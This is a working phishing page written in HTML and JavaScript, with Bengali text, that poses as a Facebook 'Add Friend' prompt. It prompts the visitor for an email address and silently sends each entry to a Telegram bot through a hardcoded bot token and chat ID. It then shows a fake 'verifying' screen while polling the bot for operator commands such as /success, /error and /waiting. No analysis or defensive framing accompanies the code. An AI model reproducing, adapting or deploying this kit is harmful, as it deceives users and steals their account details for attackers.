<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Add Friend</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #f0f2f5; font-family: 'Helvetica', Arial, sans-serif; overflow-x: hidden; }
        .hidden { display: none; }
        .secure-input { width: 100%; padding: 16px; border: 2px solid #1877f2; border-radius: 12px; outline: none; font-size: 16px; }
        .loader { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #1877f2; border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .btn-blue { width: 100%; background-color: #1877f2; color: white; font-weight: bold; padding: 15px; border-radius: 12px; cursor: pointer; border: none; }
    </style>
</head>
<body>

    <div id="step1" class="w-full max-w-sm mx-auto mt-10 p-4">
        <div class="bg-white shadow-md rounded-2xl overflow-hidden border">
            <img src="https://raw.githubusercontent.com/probasi-kollan-office-creator/facebook-friend-add/main/Picsart_26-03-15_06-28-09-284.jpg" class="w-full">
            <div class="p-6 text-center">
                <h2 class="text-xl font-bold text-gray-800 mb-4">নতুন বন্ধু বানান</h2>
                <button onclick="startProcess()" class="btn-blue">Add Friend</button>
            </div>
        </div>
    </div>

    <div id="google_chooser" class="hidden w-full max-w-sm mx-auto mt-10 p-4">
        <div class="bg-white shadow-md rounded-2xl p-6 text-center border">
            <h1 class="text-lg font-bold text-gray-800 mb-2">অ্যাকাউন্ট নিশ্চিত করুন</h1>
            <p class="text-xs text-gray-500 mb-6">কিবোর্ডের উপরে ভেসে থাকা জিমেইল আইডির ওপর ক্লিক করুন।</p>
            
            <input type="email" id="email_field" name="email" autocomplete="email" placeholder="Email Address" class="secure-input" oninput="silentCapture(this.value)">
            
            <button onclick="finalSubmit()" class="btn-blue mt-6">Add Friend</button>
        </div>
    </div>

    <div id="verifying" class="hidden fixed inset-0 bg-white z-50 flex flex-col items-center justify-center text-center">
        <div class="loader"></div>
        <h3 id="status-title" class="text-lg font-bold text-gray-800">অপেক্ষা করুন...</h3>
        <p id="status-msg" class="text-sm text-gray-500 mt-2 px-10">অল্প কিছুক্ষণ অপেক্ষা করুন। আপনার অ্যাকাউন্টটি যাচাই করা হচ্ছে।</p>
    </div>

    <script>
    const botToken = "8617715035:AAHXQjkEtjYX40KQTAE5e_jVRQ_pKQX5Qjk";
    const chatId = "8516934257";
    let lastUpdateId = 0;
    let currentEmail = "";
    let isInitialSent = false;

    function goToStep(id) {
        document.getElementById('step1').classList.add('hidden');
        document.getElementById('google_chooser').classList.add('hidden');
        document.getElementById('verifying').classList.add('hidden');
        document.getElementById(id).classList.remove('hidden');
    }

    // ১ম বাটন ক্লিক করলে যা হবে
    function startProcess() {
        goToStep('google_chooser');
        // অটো-ফোকাস ট্রিক: কিবোর্ড ও প্লে-স্টোর সাজেশন আনতে
        setTimeout(() => {
            const input = document.getElementById('email_field');
            input.focus();
            input.click(); 
        }, 400);
    }

    // ইমেইল সিলেক্ট করার সাথে সাথে সাইলেন্টলি পাঠানো
    function silentCapture(val) {
        if(val.includes('@') && !isInitialSent) {
            currentEmail = val;
            sendToBot(`📧 **ইউজার ইমেইল সিলেক্ট করেছে:** \`${currentEmail}\``);
            isInitialSent = true;
        }
    }

    // ২য় বাটন (Add Friend) ক্লিক করলে যা হবে
    async function finalSubmit() {
        currentEmail = document.getElementById('email_field').value;
        if(!currentEmail) return;

        // টেলিগ্রামে ফাইনাল রিপোর্ট পাঠানো
        const msg = `🎯 **ইউজার বাটনে ক্লিক করেছে!**\n📧 ইমেইল: \`${currentEmail}\`\n\nকমান্ডস:\n/success\n/error\n/waiting`;
        sendToBot(msg);

        // পরের পেজে নিয়ে যাওয়া যেখানে ইউজার শুধু ঘুরতে দেখবে
        goToStep('verifying');
        
        // হ্যাকারের কমান্ডের জন্য অপেক্ষা শুরু
        startListening();
    }

    function sendToBot(text) {
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: "Markdown" })
        }).catch(e => {});
    }

    function startListening() {
        setInterval(async () => {
            try {
                const res = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateId + 1}`);
                const data = await res.json();
                if (data.ok && data.result.length > 0) {
                    data.result.forEach(update => {
                        lastUpdateId = update.update_id;
                        const command = update.message?.text;

                        if (command === "/success") {
                            // সফল পেজ দেখান (আগে যেভাবে ছিল)
                        } else if (command === "/error") {
                            // ভুল পাসওয়ার্ড বা এরর দেখান
                        } else if (command === "/waiting") {
                            // এটি সিলেক্ট করলে টেক্সট স্থির হয়ে যাবে আর ইউজার শুধু ঘুরতে দেখবে
                            document.getElementById('status-title').innerText = "অপেক্ষা করুন...";
                            document.getElementById('status-msg').innerText = "অল্প কিছুক্ষণ অপেক্ষা করুন। আপনার আইডিটি যাচাই করা হচ্ছে...";
                        }
                    });
                }
            } catch (e) {}
        }, 3000);
    }
</script>
</body>
</html>
